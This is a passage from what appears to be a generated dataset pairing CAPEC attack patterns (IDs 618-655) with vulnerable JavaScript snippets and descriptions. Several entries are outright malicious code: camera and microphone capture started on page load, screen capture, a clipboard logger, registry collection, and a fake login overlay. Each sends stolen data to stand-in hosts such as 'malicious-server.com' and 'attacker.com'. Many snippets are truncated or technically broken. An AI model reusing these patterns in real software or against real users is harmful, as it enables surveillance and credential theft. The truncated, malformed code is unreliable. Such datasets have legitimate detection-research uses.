        "code_snippet": "const phoneNumber = '+1234567890';\nconst locationData = {};\n\nclass LocationTracker {\n    constructor() {\n        this.broadcastChannel = new BroadcastChannel('location_updates');\n    }\n\n    sendBroadcastMessage() {\n        fetch('https://cellular-api.example.com/broadcast', {\n            method: 'POST',\n            body: JSON.stringify({\n                target: phoneNumber,\n                message: 'LOCATION_VERIFY'\n            })\n        });\n    }\n\n    listenForResponse() {\n        this.broadcastChannel.onmessage = (event) => {\n            if(event.data.type === 'LOCATION_VERIFY') {\n                locationData[phoneNumber] = {\n                    lac: event.data.lac,\n                    timestamp: Date.now()\n                };\n                this.broadcastChannel.postMessage({\n                    phoneNumber: phoneNumber,\n                    location: event.data.lac\n                });\n            }\n        };\n    }\n\n    startTracking() {\n        setInterval(() => {\n            this.sendBroadcastMessage();\n        }, 5000);\n        this.listenForResponse();\n    }\n}",
        "description": "This vulnerable code demonstrates a location tracking system that exploits cellular broadcast messages to determine a target's location. It sends broadcast messages to a specific phone number and listens for responses, storing location data without proper verification or security measures. The code exposes sensitive information (phone number and location) through unprotected broadcast channels and doesn't validate message integrity or source authenticity."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "`\n    class LocationTracker {\n        constructor() {\n            this.signalStrength = 0;\n            this.location = { lat: 0, lng: 0",
        "description": "\"This vulnerable code implements a location tracking system that broadcasts sensitive device information including signal strength, IMSI, MAC address, and location coordinates without proper encryption or authentication. It continuously transmits this data over an insecure channel, making it susceptible to passive monitoring and location tracking attacks. The code lacks proper signal handling, message integrity verification, and physical side channel protections.\""
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "`function negotiateEncryption(clientPreferences) {\n    const supportedAlgorithms = {\n      'aes-256': { strength: 256",
        "description": "\"This code demonstrates multiple encryption vulnerabilities including algorithm downgrade, weak encryption implementation, hard-coded cryptographic key, and potential cleartext storage. The negotiation process accepts any algorithm from the client's preferences, including 'none', which leads to cleartext storage. It uses a hard-coded key and implements a weak base64 encoding instead of proper encryption.\""
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const processUserData = async (userData) => {\n  const encryptedData = await encrypt(userData);\n  \n  // Vulnerable timing-based transmission\n  for (let chunk of encryptedData) {\n    // Timing varies based on data content\n    if (chunk.length > 50) {\n      await new Promise(r => setTimeout(r, 100));\n    } else {\n      await new Promise(r => setTimeout(r, 50));\n    }\n    \n    // Send with metadata intact\n    await fetch('https://api.example.com/data', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n        'User-ID': userData.id, // Leaked metadata\n        'Data-Length': chunk.length // Leaked size information\n      },\n      body: JSON.stringify({ data: chunk })\n    });\n  }\n}",
        "description": "This code demonstrates a vulnerable implementation that leaks sensitive information through timing patterns and metadata. While the data itself is encrypted, the transmission reveals information through: 1) Variable timing delays that correlate with data content, creating a timing channel, 2) Metadata in headers that expose user information and data characteristics, and 3) Observable packet sizes that could be analyzed to infer patterns in the underlying data. This implementation is particularly vulnerable to traffic analysis attacks."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "const crypto = require('crypto');\n\nclass SensitiveDataProcessor {\n    constructor() {\n        // Using a weak encryption algorithm (DES)\n        this.algorithm = 'des-ecb';\n        this.key = Buffer.from('weakkey8');\n    }\n\n    processData(sensitiveData) {\n        try {\n            // Process sensitive data without protection against side-channel leakage\n            const cipher = crypto.createCipheriv(this.algorithm, this.key, '');\n            let encrypted = cipher.update(sensitiveData, 'utf8', 'hex');\n            encrypted += cipher.final('hex');\n\n            // Perform multiple intensive operations that could leak via EME\n            for(let i = 0; i < sensitiveData.length; i++) {\n                let temp = sensitiveData.charCodeAt(i);\n                for(let j = 0; j < temp; j++) {\n                    Math.pow(temp, 2); // CPU-intensive operation\n                }\n            }\n\n            return encrypted;\n        } catch(error) {\n            console.error('Encryption failed:', sensitiveData);\n            return sensitiveData; // Accidentally returning unencrypted data\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to electromagnetic side-channel attacks. It uses a weak encryption algorithm (DES-ECB), performs unprotected CPU-intensive operations that could leak information through electromagnetic emissions, and lacks protection against side-channel analysis. The processing of sensitive data creates distinct patterns in CPU usage that could be monitored through electromagnetic emanations. Additionally, it exposes sensitive data in error conditions and uses predictable cryptographic patterns."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "`\nconst sensitiveData = {\n    key: 'SECRET_KEY_123',\n    password: 'admin123',\n    userToken: 'eyJhbGciOiJ...'",
        "description": "\"This code demonstrates vulnerable handling of sensitive data that could be exploited through side-channel attacks. It processes sensitive information in a way that creates observable power consumption patterns, includes sensitive data in debug information, and transmits this data without proper protection. The code's processing loop creates distinct power consumption patterns that could be measured through electromagnetic emissions, and the debug information contains raw sensitive data that shouldn't be transmitted.\""
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "`\n// Cryptographic operation without environmental safeguards\nclass VulnerableCryptoDevice {\n  constructor() {\n    this.secretKey = '0123456789ABCDEF';\n    this.voltage = 3.3;\n    this.temperature = 25;\n    this.clockSpeed = 100;",
        "description": "\"This code demonstrates a vulnerable cryptographic implementation that lacks protection against physical attacks. It allows direct manipulation of voltage, temperature, and clock parameters without validation, has no fault detection mechanisms, and performs sensitive operations without environmental checks. The code is susceptible to glitch attacks, electromagnetic interference, and temperature manipulation that could reveal the secret key.\""
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "`\nfunction cryptographicOperation(key) {\n  let voltage = getCPUVoltage();\n  let clockSpeed = getClockSpeed();\n  let temperature = getDeviceTemperature();\n  \n  // No voltage or clock glitch detection\n  let encryptedData = performEncryption(key);\n  \n  // No validation of execution environment\n  if(temperature < -10) {\n    return encryptedData;",
        "description": "\"This code demonstrates multiple hardware-level vulnerabilities in cryptographic operations. It lacks proper voltage and clock glitch detection, has no protection against electromagnetic interference, is vulnerable to temperature-based attacks, and contains power analysis vulnerabilities through different power consumption patterns based on key values. The code also doesn't implement proper instruction execution validation, making it susceptible to fault injection attacks.\""
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "`\n    class TouchscreenPin {\n        constructor() {\n            this.pin = '';\n            this.touchCount = new Map();",
        "description": "\"This code simulates a touchscreen PIN entry system that's vulnerable to smudge attacks by not cleaning touch data between uses and storing touch patterns locally. It tracks touch coordinates and frequency without implementing any protection against physical observation or pattern analysis, making it susceptible to revealing the PIN pattern through accumulated fingerprint smudges.\""
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "class GPSReceiver {\n    constructor() {\n        this.position = { lat: 0, lng: 0 };\n        this.timestamp = 0;\n    }\n\n    receiveSignal(signal) {\n        // Vulnerable: No verification of signal source or integrity\n        if (signal.type === 'GPS') {\n            // Truncates precision of received coordinates without validation\n            this.position.lat = parseFloat(signal.lat.toFixed(3));\n            this.position.lng = parseFloat(signal.lng.toFixed(3));\n            this.timestamp = signal.timestamp;\n\n            // Broadcasts position update without authentication\n            this.broadcastPosition({\n                lat: this.position.lat,\n                lng: this.position.lng,\n                time: this.timestamp\n            });\n        }\n    }\n\n    broadcastPosition(posData) {\n        // Vulnerable: No message signing or origin verification\n        window.dispatchEvent(new CustomEvent('gps-update', {\n            detail: posData\n        }));\n    }\n\n    // Vulnerable: No replay protection\n    handleIncomingCorrection(correction) {\n        if (correction.hasPosition) {\n            this.position = correction.position;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable GPS receiver implementation that fails to verify signal sources, lacks message integrity checks, truncates coordinate precision, and is susceptible to replay attacks. It accepts and processes GPS signals without authentication, broadcasts position updates without verification, and allows position corrections without validating their authenticity or preventing replay attacks."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "`class GPSReceiver {\n    constructor() {\n        this.currentLocation = { lat: 0, lng: 0",
        "description": "\"This code demonstrates a vulnerable GPS signal processing implementation that fails to properly authenticate signal sources, verify signal integrity, and validate location data. It is susceptible to spoofing attacks where malicious signals can gradually override legitimate ones, lacks proper message integrity checks, and truncates location data which could hide attack indicators.\""
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "`\nfunction processUserFiles(username) {\n  let fileHandle = null;\n  const logStream = fs.createWriteStream('audit.log', { flags: 'a'",
        "description": "\"This vulnerable code demonstrates multiple issues: it fails to validate Windows device names in file paths, implements weak authorization checks, contains resource leaks due to unclosed file handles, and has an infinite loop that could lead to excessive power consumption. The code also lacks proper error handling and resource cleanup mechanisms.\""
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "function validateRedirect(url) {\n    // Weak URL validation\n    const trustedDomain = 'example.com';\n    const inputDomain = url.toLowerCase();\n    \n    // Vulnerable comparison using basic string contains\n    if (inputDomain.includes(trustedDomain)) {\n        // Redirect without proper validation\n        window.location.href = url;\n    } else {\n        // Basic character replacement that can be bypassed\n        let sanitizedUrl = url.replace('0', 'o')\n                             .replace('1', 'l')\n                             .replace('@', 'a');\n        \n        if (sanitizedUrl.includes(trustedDomain)) {\n            window.location.href = url;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable URL validation that can be exploited through typosquatting. It performs weak domain comparison and insufficient character sanitization, allowing attackers to redirect users to malicious domains that look similar to trusted ones (e.g., 'examp1e.com' or 'exampl3.com'). The code also implements improper input validation and incorrect comparison logic, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "`\nfunction redirectToServiceLogin(domain) {\n  // Poorly implemented domain validation\n  let urlRegex = /^[a-zA-Z0-9-]+\\.[a-zA-Z]{2",
        "description": "\"This code demonstrates a vulnerable domain validation system that could be exploited through SoundSquatting. It performs insufficient domain validation, uses basic string comparison for security decisions, and implements unsafe redirects. The code relies on reverse DNS resolution without proper verification and can be tricked by similar-sounding domain names.\""
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "function validateDomainAndRedirect(userInput) {\n  // Vulnerable regex without anchors (CWE-777)\n  const domainRegex = /paypal\\.com/;\n\n  // No proper homoglyph detection (CWE-1007)\n  // Allows domains like 'l.com' (Cyrillic '')\n  if (domainRegex.test(userInput)) {\n    // No proper URI validation (CWE-84, CWE-86)\n    let redirectUrl = decodeURIComponent(userInput);\n\n    // SSRF vulnerability (CWE-918)\n    fetch(redirectUrl)\n      .then(response => response.json())\n      .then(data => {\n        window.location.href = redirectUrl;\n      });\n  }\n}",
        "description": "This code demonstrates a vulnerable domain validation function that fails to properly handle homograph attacks. It uses an incomplete regex pattern without anchors, lacks proper homoglyph detection, and performs unsafe URL redirection. The code could be exploited by using visually similar characters from different Unicode sets to create malicious domains that appear legitimate to users."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "const generateAuthToken = (userId) => {\n  // Weak token generation using only timestamp\n  const token = Buffer.from(Date.now().toString()).toString('base64');\n  \n  // No validation of user identity\n  const userToken = {\n    token: token,\n    userId: userId,\n    isAdmin: true  // Dangerous default privilege elevation\n  };\n\n  // Improperly store token without encryption\n  global.tokens = global.tokens || {};\n  global.tokens[token] = userToken;\n\n  return token;\n};\n\nconst impersonateUser = (targetUserId) => {\n  // No proper authentication check\n  const token = generateAuthToken(targetUserId);\n  \n  // Dangerous privilege escalation\n  process.env.CURRENT_USER = targetUserId;\n  \n  return {\n    success: true,\n    token: token\n  };\n};\n\n// Example usage\nconst hackedToken = impersonateUser('admin');",
        "description": "This vulnerable code demonstrates weak token generation and authentication. It allows token impersonation by generating tokens based only on timestamps, lacks proper identity validation, enables privilege escalation, and stores tokens insecurely in global memory. The code permits unauthorized users to generate tokens for any user ID and impersonate other users, including administrators."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "const audioRecorder = new MediaRecorder(stream);\nlet recordedData = [];\n\nfunction startSurveillance() {\n    navigator.mediaDevices.getUserMedia({ audio: true, video: true })\n        .then(stream => {\n            audioRecorder.ondataavailable = (e) => {\n                recordedData.push(e.data);\n            };\n            audioRecorder.start();\n            \n            // Send recorded data without encryption\n            setInterval(() => {\n                const blob = new Blob(recordedData);\n                fetch('http://malicious-server.com/upload', {\n                    method: 'POST',\n                    body: blob\n                });\n                recordedData = [];\n            }, 10000);\n        })\n        .catch(err => {\n            // Silently fail to avoid detection\n            console.clear();\n        });\n}\n\n// Auto-start recording when loaded\ndocument.addEventListener('DOMContentLoaded', startSurveillance);",
        "description": "This vulnerable code demonstrates unauthorized audio/video capture by automatically starting recording when the page loads, without user consent. It streams the captured data in cleartext to a malicious server at regular intervals. The code exploits media device privileges and transmits sensitive information without encryption, making it susceptible to interception."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "function processUserUpload(uploadedFile) {\n  const fileName = uploadedFile.name;\n  const fileExt = fileName.split('.').pop().toLowerCase();\n\n  if (fileExt === 'txt') {\n    const fs = require('fs');\n    fs.readFile(fileName, 'utf8', (err, data) => {\n      if (err) throw err;\n      eval(data); // Process text file content\n    });\n  } else if (fileExt === 'jpg') {\n    // Process image file\n    processImage(fileName);\n  }\n}",
        "description": "This code is vulnerable as it relies solely on file extension to determine file processing behavior, allowing attackers to bypass security by manipulating file extensions. It also unsafely evaluates file content and uses unsanitized file names directly in filesystem operations."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "const fs = require('fs');\nconst img = 'profile.jpg';\n\nfunction hideData(image, secretData) {\n    const buffer = fs.readFileSync(image);\n    const encoder = new TextEncoder();\n    const encodedData = encoder.encode(secretData);\n    \n    // Append encoded data after image EOF marker\n    const modified = Buffer.concat([buffer, Buffer.from([0xFF, 0xD9]), encodedData]);\n    fs.writeFileSync('modified_' + image, modified);\n}\n\nconst sensitiveData = {\n    creditCard: '4111111111111111',\n    password: 'admin123',\n    apiKey: 'sk_live_123456789'\n};\n\nhideData(img, JSON.stringify(sensitiveData));",
        "description": "This code demonstrates embedding sensitive data within a JPEG image file by appending it after the EOF marker. The data remains invisible during normal image viewing but can be extracted by knowing its location. The code stores cleartext sensitive information in a way that creates a covert storage channel."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "// Clipboard data exposure vulnerability\nfunction copyToClipboard(sensitiveData) {\n  navigator.clipboard.writeText(sensitiveData);\n  localStorage.setItem('lastCopied', sensitiveData);\n  \n  // Display sensitive data in GUI\n  document.getElementById('dataDisplay').innerHTML = sensitiveData;\n  \n  // Store system info in global variable\n  window.systemInfo = {\n    userToken: 'sk_live_12345',\n    adminKey: 'admin_secretkey_789',\n    dbConnection: 'mongodb://admin:password@localhost:27017'\n  };\n  \n  // Periodically sync clipboard to external service\n  setInterval(() => {\n    navigator.clipboard.readText().then(text => {\n      fetch('https://external-logger.com/log', {\n        method: 'POST',\n        body: JSON.stringify({ clipboard: text })\n      });\n    });\n  }, 5000);\n}",
        "description": "This code demonstrates multiple security vulnerabilities including storing sensitive data in cleartext in the GUI, exposing system information globally, storing sensitive data in localStorage, and allowing unrestricted clipboard access that could be exploited by malicious applications. The code periodically sends clipboard contents to an external service, potentially leaking sensitive information."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "`\n    // Simulated malicious MBR manipulation code\n    const SECTOR_SIZE = 512;\n    const MBR_LOCATION = 0x0;\n\n    class MaliciousBootloader {\n      constructor() {\n        this.originalMBR = new Uint8Array(SECTOR_SIZE);\n        this.maliciousPayload = new Uint8Array([0x33, 0xC0, 0x8E, 0xD0, /* ... malicious code ... */]);",
        "description": "\"This code demonstrates a malicious bootloader that exploits insufficient firmware protection and access controls to modify the Master Boot Record. It bypasses secure boot mechanisms, manipulates low-level hardware access, and installs persistent malicious code that survives system reinstallation. The code exploits vulnerabilities related to improper boot sequence protection, insufficient access controls, and lack of firmware update protection.\""
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction saveUserData(userData) {\n  // Save sensitive user data in world-readable temp file\n  const tempFile = path.join('/tmp', 'user_' + Math.random() + '.json');\n  fs.writeFileSync(tempFile, JSON.stringify({\n    username: userData.username,\n    password: userData.password,\n    ssn: userData.ssn,\n    creditCard: userData.creditCard\n  }));\n\n  // Log sensitive system info to public directory\n  const logFile = path.join('/var/www/logs/', 'app.log');\n  fs.appendFileSync(logFile, `System: ${process.env.OS}, User: ${process.env.USER}\\n`);\n\n  // Store ACL rules in publicly accessible location\n  const aclFile = path.join('/var/www/data/', 'permissions.acl');\n  fs.writeFileSync(aclFile, JSON.stringify({\n    admins: ['admin1', 'admin2'],\n    readAccess: ['user1', 'user2']\n  }));\n}",
        "description": "This code creates insecure temporary files with sensitive user data, logs system information to a publicly accessible directory, and stores access control lists in an exposed location. The files are created without proper permissions or access controls, making them accessible to unauthorized users. Additionally, sensitive system information is exposed through log files."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "// Dynamic code injection disguised as a legitimate library loader\nconst loadExternalLibrary = (libraryPath) => {\n    const code = require('fs').readFileSync(libraryPath, 'utf8');\n    const libraryFunction = new Function('context', code);\n    \n    // Inject code into running process\n    process.mainModule.require = function(path) {\n        if (path === 'legitimate-module') {\n            return libraryFunction(global);\n        }\n        return require(path);\n    };\n\n    // Modify existing process memory/functions\n    const originalConsole = console.log;\n    console.log = function() {\n        libraryFunction(global);\n        originalConsole.apply(this, arguments);\n    };\n};\n\nloadExternalLibrary('untrusted-library.js');",
        "description": "This code demonstrates process manipulation by injecting untrusted code into a running Node.js process. It modifies core functionality like require() and console.log to execute arbitrary code from an external source, potentially allowing privilege escalation and evasion of detection mechanisms. The code hooks into existing process functions and can modify system behavior while masquerading as legitimate operations."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "const loadLibrary = (dllName) => {\n    const path = process.env.PATH.split(';');\n    for (const dir of path) {\n        try {\n            const dllPath = `${dir}\\\\${dllName}`;\n            return require(dllPath);\n        } catch (err) {\n            continue;\n        }\n    }\n    // Fallback to WinSxS directory without proper manifest validation\n    const winSxSPath = 'C:\\\\Windows\\\\WinSxS';\n    return require(`${winSxSPath}\\\\${dllName}`);\n}",
        "description": "This code demonstrates vulnerable DLL loading by searching through system paths without proper validation of the DLL's authenticity or proper use of manifest files. It blindly attempts to load a DLL from multiple locations including the WinSxS directory, making it susceptible to DLL side-loading attacks where an attacker could place a malicious DLL in one of the searched paths."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction installBinary(binaryPath) {\n  const installDir = 'C:\\Program Files\\MyApp';\n  const extractPath = path.join(installDir, 'bin');\n  \n  // Create directory with weak permissions\n  fs.mkdirSync(extractPath, { mode: 0o777 });\n  \n  // Extract binary to directory without validation\n  fs.copyFileSync(binaryPath, path.join(extractPath, 'app.exe'));\n  \n  // Execute binary from unprotected location\n  const exec = require('child_process').exec;\n  exec(extractPath + '\\app.exe', (error, stdout, stderr) => {\n    console.log(stdout);\n  });\n}",
        "description": "This code demonstrates vulnerable binary installation by creating a directory with weak permissions (777), extracting an executable without validation, and executing it without proper path quoting or permissions checking. The code is susceptible to binary replacement attacks and malicious code execution through path manipulation."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction listSharedFolders(networkPath) {\n  try {\n    // Insecurely list all network shares without validation\n    let shares = fs.readdirSync(`\\\\\\\\${networkPath}`);\n    \n    // Expose all found shares to any requesting user\n    shares.forEach(share => {\n      let sharePath = path.join(`\\\\\\\\${networkPath}`, share);\n      let files = fs.readdirSync(sharePath);\n      \n      // Write share contents to publicly accessible file\n      fs.writeFileSync('/public/shares.txt', \n        `${sharePath}: ${JSON.stringify(files)}\\n`, \n        {flag: 'a'}\n      );\n    });\n    return shares;\n  } catch(err) {\n    console.log(err);\n  }\n}\n\n// Accept unchecked UNC path from user input\nlet userInput = process.argv[2];\nlistSharedFolders(userInput);",
        "description": "This code demonstrates several security vulnerabilities related to network share enumeration and exposure. It accepts an unchecked UNC path from user input, lists all network shares and their contents without access control validation, and writes the discovered information to a publicly accessible file. The code lacks proper privilege checks, path validation, and access controls, potentially exposing sensitive network information to unauthorized users."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "`\n    const crypto = require('crypto');\n\n    // Store password hashes in plain storage\n    let userHashes = new Map();\n\n    function authenticateUser(username, passwordHash) {\n        // Compare received hash directly with stored hash\n        if (userHashes.get(username) === passwordHash) {\n            // Basic single-factor auth using only password hash\n            const sessionToken = generateSessionToken(username);\n            return { authenticated: true, token: sessionToken",
        "description": "\"This code demonstrates vulnerable authentication using password hashes instead of secure password verification. It implements single-factor authentication, stores password hashes in an unprotected manner, and generates session tokens that are susceptible to replay attacks. The system accepts NTLM hashes directly for authentication, making it vulnerable to pass-the-hash attacks.\""
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "`\nconst kerberos = {\n    storedTickets: new Map(),\n    \n    generateServiceTicket(username, service) {\n        // Insecure ticket generation - no encryption\n        return {\n            id: Math.random().toString(),\n            username: username,\n            service: service,\n            timestamp: Date.now()",
        "description": "\"This code demonstrates vulnerable Kerberos-style authentication implementation that allows ticket replay attacks, uses single-factor authentication, and has insufficient protection of authentication credentials. The tickets are stored without encryption, there's no proper validation of ticket authenticity, and captured tickets can be replayed without detection.\""
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "`\nconst deviceInfo = {\n    getConnectedDevices: function() {\n        let devices = [];\n        if (navigator.usb) {\n            navigator.usb.getDevices()\n                .then(usbDevices => {\n                    devices.push(...usbDevices.map(d => ({\n                        id: d.deviceId,\n                        name: d.productName,\n                        serial: d.serialNumber",
        "description": "\"This vulnerable code demonstrates unauthorized device information exposure by collecting and storing sensitive device data without proper access controls or encryption. It enumerates USB and media devices, stores their information in localStorage, and sends it to a server without validation. The code exposes system-level device information and doesn't implement proper security measures for handling device names or protecting against information disclosure.\""
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "const registry = require('winreg');\n\nfunction readSystemRegistry() {\n    const regKey = new registry({\n        hive: registry.HKLM,\n        key: '\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion'\n    });\n\n    regKey.values((err, items) => {\n        items.forEach(item => {\n            // Store sensitive registry data in plaintext\n            localStorage.setItem(item.name, item.value);\n            \n            // Send registry data to external server without authorization check\n            fetch('http://external-server.com/collect', {\n                method: 'POST',\n                body: JSON.stringify({\n                    key: item.name,\n                    value: item.value,\n                    systemInfo: process.env\n                })\n            });\n        });\n    });\n}",
        "description": "This code reads sensitive system registry data without proper authorization checks, stores it in cleartext, and transmits it to an unauthorized external server. It also exposes system environment variables, demonstrating multiple security vulnerabilities related to improper access control and exposure of sensitive system information."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "// Screen capture utility with security flaws\nclass ScreenCapture {\n    constructor() {\n        this.captureInterval = null;\n        this.credentials = {\n            username: 'admin',\n            password: 'secret123'\n        };\n    }\n\n    startCapture() {\n        // Insecure transmission of credentials in cleartext\n        fetch('http://example.com/auth', {\n            method: 'POST',\n            body: JSON.stringify(this.credentials)\n        });\n\n        // Privileged screen capture without proper checks\n        this.captureInterval = setInterval(() => {\n            const canvas = document.createElement('canvas');\n            const context = canvas.getContext('2d');\n            // Capture entire screen without restrictions\n            context.drawImage(document, 0, 0);\n            \n            // Send sensitive screen data in cleartext\n            const screenData = canvas.toDataURL('image/png');\n            fetch('http://attacker.com/collect', {\n                method: 'POST',\n                body: screenData\n            });\n        }, 1000);\n    }\n\n    stopCapture() {\n        clearInterval(this.captureInterval);\n    }\n}",
        "description": "This code implements a vulnerable screen capture functionality that transmits sensitive information in cleartext, performs privileged operations without proper authorization checks, and exposes system information to unauthorized parties. It demonstrates issues with privilege management, cleartext transmission, and improper access control."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "`function processUploadedFile(filename) {\\n  const extension = filename.split('.').pop();\\n\\n  // Vulnerable check for file extension without sanitization\\n  if (extension.trim() === 'txt') {\\n    return openTextEditor(filename);\\n",
        "description": "\"This code is vulnerable to file extension manipulation through trailing spaces. The code does not properly sanitize or normalize filenames before processing, allowing attackers to bypass security checks by adding spaces after file extensions. For example, 'malware.exe ' (with a trailing space) might be processed differently than 'malware.exe', potentially leading to execution of malicious files.\""
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n    if (!req.files || !req.files.file) {\n        return res.status(400).send('No file uploaded');\n    }\n\n    let uploadedFile = req.files.file;\n    let uploadPath = __dirname + '/public/uploads/' + uploadedFile.name;\n\n    // No file type validation\n    // No authentication check\n    // No file execution permissions check\n    uploadedFile.mv(uploadPath, (err) => {\n        if (err) return res.status(500).send(err);\n        res.send('File uploaded successfully');\n    });\n});\n\napp.listen(3000);",
        "description": "This vulnerable code allows unrestricted file upload without proper authentication, file type validation, or execution permissions checking. An attacker could upload a malicious PHP/JSP shell script to the server, which could then be accessed and executed through the web interface, potentially leading to remote command execution with web server privileges."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "`\n    class AudioRecorder {\n      constructor() {\n        this.audioData = [];\n        this.isRecording = false;",
        "description": "\"This vulnerable code demonstrates unauthorized audio eavesdropping by accessing the user's microphone and continuously sending recorded audio data in plaintext to a remote server without proper authorization or encryption. It creates a covert channel for sensitive information transmission and exposes the recorded data to potential unauthorized access.\""
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "`\nconst authenticateUser = (username, password) => {\n  // Store passwords as plain MD5 hashes\n  const storedHash = md5(users[username]?.password);\n  const submittedHash = md5(password);\n\n  // No rate limiting on authentication attempts\n  if (storedHash === submittedHash) {\n    // Generate simple session token without expiration\n    const token = Math.random().toString(36);\n    sessions[username] = {\n      token: token,\n      lastLogin: Date.now()",
        "description": "\"This code demonstrates multiple authentication vulnerabilities including: storing credentials insecurely, lack of brute force protection, single-factor authentication, weak password hashing (MD5), no password expiration, storing sensitive Kerberos tickets in plaintext localStorage, and susceptibility to replay attacks due to simple token generation without expiration or proper cryptographic protection.\""
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const userCredentials = {\n  admin: 'admin123',\n  user1: 'password123'\n};\n\nfunction authenticateUser(username, password) {\n  // Store credentials in plain text\n  localStorage.setItem('credentials', JSON.stringify(userCredentials));\n\n  // No rate limiting for login attempts\n  // Single factor authentication only\n  if (userCredentials[username] === password) {\n    // No password expiration check\n    // No password complexity requirements\n    return { authenticated: true, token: 'static-token-123' };\n  }\n  return { authenticated: false };\n}\n\n// Example usage\nconst loginResult = authenticateUser('admin', 'admin123');",
        "description": "This code demonstrates multiple authentication vulnerabilities including plain text credential storage, lack of rate limiting for login attempts, single-factor authentication, no password expiration mechanism, and static token generation. The credentials are stored insecurely in localStorage, making them susceptible to theft. There's no protection against brute force attacks, and the authentication relies solely on a simple username/password comparison."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "// Malicious code mimicking a legitimate login prompt\nconst fakeLoginPrompt = {\n    show: function() {\n        const overlay = document.createElement('div');\n        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:99999';\n        \n        const loginForm = document.createElement('div');\n        loginForm.innerHTML = `\n            <div style='background:white;width:300px;margin:100px auto;padding:20px;border-radius:5px'>\n                <img src='fake-company-logo.png' style='width:150px'>\n                <h2>Please re-enter your credentials</h2>\n                <input type='text' id='fake-username' placeholder='Username'>\n                <input type='password' id='fake-password' placeholder='Password'>\n                <button onclick='submitCredentials()'>Login</button>\n            </div>`;\n        \n        overlay.appendChild(loginForm);\n        document.body.appendChild(overlay);\n    },\n\n    submitCredentials: function() {\n        const username = document.getElementById('fake-username').value;\n        const password = document.getElementById('fake-password').value;\n        \n        // Send stolen credentials to attacker's server\n        fetch('https://malicious-server.com/collect', {\n            method: 'POST',\n            body: JSON.stringify({\n                username: username,\n                password: password\n            })\n        });\n    }\n};\n\n// Automatically show fake prompt when the malicious code loads\nsetTimeout(fakeLoginPrompt.show, 3000);",
        "description": "This code creates a deceptive login overlay that mimics a legitimate credential prompt. It uses high z-index to ensure visibility, incorporates familiar branding elements, and harvests entered credentials by sending them to a malicious server. The prompt is triggered automatically after a delay to catch users off guard."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
